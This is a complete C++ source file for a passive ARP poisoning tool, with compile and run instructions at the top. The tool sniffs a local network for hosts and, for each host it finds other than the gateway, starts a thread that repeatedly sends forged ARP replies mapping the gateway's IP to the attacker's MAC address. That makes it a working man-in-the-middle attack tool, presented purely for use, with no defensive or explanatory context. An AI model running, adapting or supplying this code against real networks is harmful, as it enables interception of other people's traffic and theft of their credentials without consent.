// Compile: g++ -o arp_passive arp_passive.cpp -lpthread
// Run: sudo ./arp_passive <iface> <attacker_mac> <gateway_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <map>
#include <string>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class PassiveARPPoison {
private:
    int sock;
    std::string iface, attackerMAC, gatewayIP;
    std::atomic<bool> running{false};
    std::map<std::string, std::string> arpTable;  // IP -> MAC
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    PassiveARPPoison(const std::string& i, const std::string& amac,
                     const std::string& gIP)
        : iface(i), attackerMAC(amac), gatewayIP(gIP) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(s, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
        close(s);
    }
    
    // Passively sniff ARP traffic to build table
    void passiveSniff() {
        uint8_t buffer[65536];
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* eth = (struct ether_header*)buffer;
            if (ntohs(eth->ether_type) != ETH_P_ARP) continue;
            
            struct ether_arp* arp = (struct ether_arp*)(buffer + 14);
            
            char senderIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->arp_spa, senderIP, sizeof(senderIP));
            
            char senderMAC[18];
            snprintf(senderMAC, sizeof(senderMAC), 
                     "%02x:%02x:%02x:%02x:%02x:%02x",
                     arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2],
                     arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
            
            std::string ip(senderIP);
            std::string mac(senderMAC);
            
            if (arpTable.find(ip) == arpTable.end()) {
                arpTable[ip] = mac;
                std::cout << "[+] Discovered: " << ip << " -> " << mac << "\n";
                
                // Start poisoning newly discovered target
                if (ip != gatewayIP) {
                    std::thread([this, ip, mac]() {
                        while (running.load()) {
                            sendARP(gatewayIP, attackerMAC, ip, mac);
                            usleep(2000000);
                        }
                    }).detach();
                }
            }
        }
    }
    
    void run() {
        std::cout << "[*] Passive ARP poisoning - sniffing for victims\n";
        running = true;
        passiveSniff();
    }
    
    ~PassiveARPPoison() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <iface> <attacker_mac> <gateway_ip>\n";
        return 1;
    }
    PassiveARPPoison poison(argv[1], argv[2], argv[3]);
    poison.run();
    return 0;
}
